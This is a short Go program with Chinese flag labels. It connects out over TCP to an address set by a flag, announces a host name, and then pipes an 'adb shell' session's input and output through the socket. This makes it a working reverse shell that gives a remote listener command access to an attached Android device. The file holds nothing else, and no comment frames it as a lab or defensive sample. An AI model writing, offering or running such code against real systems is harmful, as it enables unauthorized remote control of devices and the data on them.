package main

import (
	"flag"
	"fmt"
	"net"
	"os/exec"
)

var r string
var name string

func main(){
	flag.StringVar(&r,"r","127.0.0.1:6767","远程地址")
	flag.StringVar(&name,"n","游客","主机名")
	flag.Parse()

	cmd :=exec.Command("adb","shell")

	conn,err:=net.Dial("tcp4",r)
	if err != nil {
		fmt.Println(err)
		return
	}

	conn.Write([]byte(fmt.Sprintf("Im:%s\n",name)))

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()
}
